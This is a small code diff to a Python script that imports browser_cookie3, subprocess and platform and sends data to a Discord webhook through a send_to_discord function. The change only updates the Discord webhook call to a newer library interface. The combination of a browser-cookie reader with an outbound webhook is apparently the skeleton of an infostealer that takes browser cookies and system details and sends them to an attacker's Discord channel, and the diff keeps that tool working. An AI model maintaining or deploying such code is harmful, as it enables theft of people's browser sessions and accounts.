@@ -2,7 +2,7 @@ import os
 import requests
 import subprocess
 import platform
-from discord import Webhook, RequestsWebhookAdapter
+from discord import Webhook
 import browser_cookie3
 
 # Your Discord webhook URL
@@ -10,7 +10,7 @@ webhook_url = 'YOUR_WEBHOOK_URL'  # Replace this with your actual webhook URL
 
 # Function to send data to the Discord webhook
 def send_to_discord(content):
-    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
+    webhook = Webhook.from_url(webhook_url)
     try:
         webhook.send(content)
         print("Data sent to webhook")
